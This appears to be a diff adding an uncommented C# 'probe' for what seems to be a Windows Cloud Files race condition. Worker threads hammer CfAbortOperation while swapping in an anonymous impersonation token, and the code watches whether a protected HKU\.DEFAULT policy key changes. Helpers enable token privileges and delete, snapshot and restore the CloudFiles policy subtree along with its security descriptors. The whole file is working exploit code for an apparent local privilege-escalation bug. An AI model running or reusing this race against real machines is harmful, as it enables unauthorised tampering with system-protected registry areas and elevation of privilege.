@@ -1,0 +1,42 @@
+
+using System;using System.Collections.Generic;using System.Runtime.InteropServices;using System.Security.AccessControl;using System.Threading;using Microsoft.Win32;using Microsoft.Win32.SafeHandles;
+public class KeyInfo{public string RelativePath;public byte[] Sd;public List<ValueInfo> Values=new List<ValueInfo>();}
+public class ValueInfo{public string Name;public RegistryValueKind Kind;public object Data;}
+public static class MiniPlasmaProbe{
+[DllImport("cldapi.dll")]static extern int CfAbortOperation(int p,IntPtr u,int f);
+[StructLayout(LayoutKind.Sequential)]public struct CF_PLATFORM_INFO{public int BuildNumber,RevisionNumber,IntegrationNumber;}
+[DllImport("cldapi.dll")]public static extern int CfGetPlatformInfo(out CF_PLATFORM_INFO i);
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool ImpersonateAnonymousToken(IntPtr t);
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool RevertToSelf();
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool SetThreadToken(IntPtr p,IntPtr t);
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool OpenThreadToken(IntPtr t,uint a,bool s,out IntPtr k);
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool OpenProcessToken(IntPtr p,uint a,out IntPtr k);
+[DllImport("advapi32.dll",CharSet=CharSet.Unicode,SetLastError=true)]static extern bool LookupPrivilegeValue(string s,string n,out long l);
+[StructLayout(LayoutKind.Sequential)]struct TP1{public int Count;public long Luid;public int Attr;}
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP1 n,int l,IntPtr p,IntPtr r);
+[DllImport("kernel32.dll")]static extern IntPtr GetCurrentThread();
+[DllImport("kernel32.dll",SetLastError=true)]static extern IntPtr OpenThread(uint a,bool i,uint t);
+[DllImport("kernel32.dll")]static extern uint GetCurrentThreadId();
+[DllImport("kernel32.dll",SetLastError=true)]static extern bool CloseHandle(IntPtr h);
+[DllImport("advapi32.dll",SetLastError=true)]static extern int RegNotifyChangeKeyValue(SafeRegistryHandle h,bool s,uint f,SafeWaitHandle e,bool a);
+[DllImport("advapi32.dll",CharSet=CharSet.Unicode,SetLastError=true)]static extern int RegDeleteTree(IntPtr h,string s);
+static readonly IntPtr HKU=new IntPtr(unchecked((int)0x80000003));
+const string CF=@".DEFAULT\Software\Policies\Microsoft\CloudFiles";
+const AccessControlSections SDS=AccessControlSections.Owner|AccessControlSections.Group|AccessControlSections.Access;
+static volatile bool _stop;
+static IntPtr _at;
+public static bool EnablePrivilege(string n){IntPtr t;if(!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle,0x28,out t))return false;try{long l;if(!LookupPrivilegeValue(null,n,out l))return false;TP1 p=new TP1();p.Count=1;p.Luid=l;p.Attr=0x2;return AdjustTokenPrivileges(t,false,ref p,0,IntPtr.Zero,IntPtr.Zero);}finally{CloseHandle(t);}}
+static IntPtr AcquireAnonToken(){IntPtr c=GetCurrentThread();if(!ImpersonateAnonymousToken(c))throw new Exception("IAT:"+Marshal.GetLastWin32Error());IntPtr t;bool ok=OpenThreadToken(c,0xE,true,out t);int e=Marshal.GetLastWin32Error();RevertToSelf();if(!ok)throw new Exception("OTT:"+e);return t;}
+class Wk{public IntPtr H,HP;public volatile bool R;
+public void C(){try{H=OpenThread(0xC0,false,GetCurrentThreadId());if(H==IntPtr.Zero)return;HP=Marshal.AllocHGlobal(IntPtr.Size);Marshal.WriteIntPtr(HP,H);R=true;int p=System.Diagnostics.Process.GetCurrentProcess().Id;while(!_stop)CfAbortOperation(p,IntPtr.Zero,2);}catch{}finally{if(HP!=IntPtr.Zero){Marshal.FreeHGlobal(HP);HP=IntPtr.Zero;}if(H!=IntPtr.Zero){CloseHandle(H);H=IntPtr.Zero;}}}
+public void F(){while(!R&&!_stop)Thread.Sleep(1);if(_stop)return;IntPtr h=HP,a=_at;while(!_stop){SetThreadToken(h,a);SetThreadToken(h,IntPtr.Zero);}}}
+public static bool Probe(int ms,int par,out string d){d=null;RegistryKey w=Registry.Users.OpenSubKey(@".DEFAULT\Software\Policies\Microsoft",false);if(w==null){d="OpenSubKey failed.";return false;}
+try{_at=AcquireAnonToken();}catch(Exception ex){w.Dispose();d=ex.Message;return false;}
+using(w)using(ManualResetEvent e=new ManualResetEvent(false)){int hr=RegNotifyChangeKeyValue(w.Handle,true,0x1,e.SafeWaitHandle,true);if(hr!=0){d=string.Format("RegNotifyChangeKeyValue:0x{0:X8}",hr);CloseHandle(_at);_at=IntPtr.Zero;return false;}
+_stop=false;List<Thread> ts=new List<Thread>();for(int i=0;i<par;i++){Wk wk=new Wk();Thread c=new Thread(wk.C){IsBackground=true};Thread f=new Thread(wk.F){IsBackground=true};c.Start();f.Start();ts.Add(c);ts.Add(f);}
+bool s;try{s=e.WaitOne(ms);}finally{_stop=true;foreach(Thread t in ts){try{t.Join(1000);}catch{}}}
+d=s?"Registry change observed during race window.":"No registry change within "+(ms/1000)+"s.";CloseHandle(_at);_at=IntPtr.Zero;return s;}}
+public static int DeleteCloudFilesSubtree(){return RegDeleteTree(HKU,CF);}
+public static List<KeyInfo> SnapshotCloudFiles(){List<KeyInfo> l=new List<KeyInfo>();RegistryKey r=null;try{r=Registry.Users.OpenSubKey(CF,RegistryKeyPermissionCheck.ReadSubTree,RegistryRights.ReadKey|RegistryRights.ReadPermissions);}catch{return l;}if(r==null)return l;using(r)SR(r,"",l);return l;}
+static void SR(RegistryKey k,string rel,List<KeyInfo> sk){KeyInfo i=new KeyInfo();i.RelativePath=rel;try{i.Sd=k.GetAccessControl(SDS).GetSecurityDescriptorBinaryForm();}catch{}try{foreach(string vn in k.GetValueNames()){try{ValueInfo v=new ValueInfo();v.Name=vn;v.Kind=k.GetValueKind(vn);v.Data=k.GetValue(vn,null,RegistryValueOptions.DoNotExpandEnvironmentNames);i.Values.Add(v);}catch{}}}catch{}sk.Add(i);string[] subs;try{subs=k.GetSubKeyNames();}catch{return;}foreach(string sn in subs){RegistryKey sub=null;try{sub=k.OpenSubKey(sn,RegistryKeyPermissionCheck.ReadSubTree,RegistryRights.ReadKey|RegistryRights.ReadPermissions);}catch{}if(sub==null)continue;try{SR(sub,rel.Length==0?sn:rel+"\\"+sn,sk);}finally{sub.Close();}}}
+public static int RestoreCloudFiles(List<KeyInfo> snap){int n=0;foreach(KeyInfo ki in snap){string p=ki.RelativePath.Length==0?CF:CF+"\\"+ki.RelativePath;try{using(RegistryKey k=Registry.Users.CreateSubKey(p)){foreach(ValueInfo vi in ki.Values){try{k.SetValue(vi.Name,vi.Data,vi.Kind);}catch{}}}if(ki.Sd!=null){using(RegistryKey wk=Registry.Users.OpenSubKey(p,RegistryKeyPermissionCheck.ReadWriteSubTree,RegistryRights.ChangePermissions|RegistryRights.TakeOwnership)){if(wk!=null){RegistrySecurity sec=new RegistrySecurity();sec.SetSecurityDescriptorBinaryForm(ki.Sd,SDS);wk.SetAccessControl(sec);}}}n++;}catch{}}return n;}}
